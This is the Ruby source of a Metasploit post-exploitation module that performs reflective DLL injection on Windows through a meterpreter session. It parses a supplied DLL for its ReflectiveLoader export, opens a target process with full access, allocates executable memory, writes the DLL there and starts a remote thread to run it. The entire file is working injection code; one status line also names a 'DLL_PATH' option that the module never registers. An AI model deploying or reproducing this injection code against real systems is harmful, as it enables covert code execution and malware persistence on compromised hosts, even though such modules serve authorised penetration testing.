##
# ## This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Manage Reflective DLL Injection Module',
      'Description'   => %q{
        This module will inject into the memory of a process a specified Reflective DLL.
      },
      'License'      => MSF_LICENSE,
      'Author'       => [ 'Ben Campbell <eat_meatballs[at]hotmail.co.uk>'],
      'Platform'     => [ 'win' ],
      'SessionTypes' => [ 'meterpreter' ],
      'References'   =>
        [
          [ 'URL', 'https://github.com/stephenfewer/ReflectiveDLLInjection' ]
        ]
    ))

    register_options(
      [
        OptPath.new('PATH',[true, 'Reflective DLL to inject into memory of a process.']),
        OptInt.new('PID',[true, 'Process Identifier to inject of process to inject payload.']),
      ], self.class)
  end

  # Run Method for when run command is issued
  def run
    # syinfo is only on meterpreter sessions
    print_status("Running module against #{sysinfo['Computer']}") if not sysinfo.nil?

    dll = ''
    offset = nil
    begin
      File.open( datastore['PATH'], "rb" ) { |f| dll += f.read(f.stat.size) }

      pe = Rex::PeParsey::Pe.new( Rex::ImageSource::Memory.new( dll ) )

      pe.exports.entries.each do |entry|
        if( entry.name =~ /^\S*ReflectiveLoader\S*/ )
          offset = pe.rva_to_file_offset( entry.rva )
          break
        end
      end

      raise "Can't find an exported ReflectiveLoader function!" if offset.nil? or offset == 0
    rescue
      print_error( "Failed to read and parse Dll file: #{$!}" )
      return
    end

    inject_into_pid(dll, datastore['PID'], offset)
  end

  def inject_into_pid(pay, pid, offset)

    if offset.nil? or offset == 0
      print_error("Reflective Loader offset is nil.")
      return
    end

    if pay.nil? or pay.empty?
      print_error("Invalid DLL.")
      return
    end

    if pid.nil? or not has_pid?(pid)
      print_error("Invalid PID.")
      return
    end

    print_status("Injecting #{datastore['DLL_PATH']} into process ID #{pid}")
    begin
      print_status("Opening process #{pid}")
      host_process = client.sys.process.open(pid.to_i, PROCESS_ALL_ACCESS)
      print_status("Allocating memory in procees #{pid}")
      mem = host_process.memory.allocate(pay.length + (pay.length % 1024))
      # Ensure memory is set for execution
      host_process.memory.protect(mem)
      vprint_status("Allocated memory at address #{"0x%.8x" % mem}, for #{pay.length} bytes")
      print_status("Writing the payload into memory")
      host_process.memory.write(mem, pay)
      print_status("Executing payload")
      host_process.thread.create(mem+offset, 0)
      print_good("Successfully injected payload in to process: #{pid}")
    rescue ::Exception => e
      print_error("Failed to Inject Payload to #{pid}!")
      vprint_error(e.to_s)
    end
  end
end

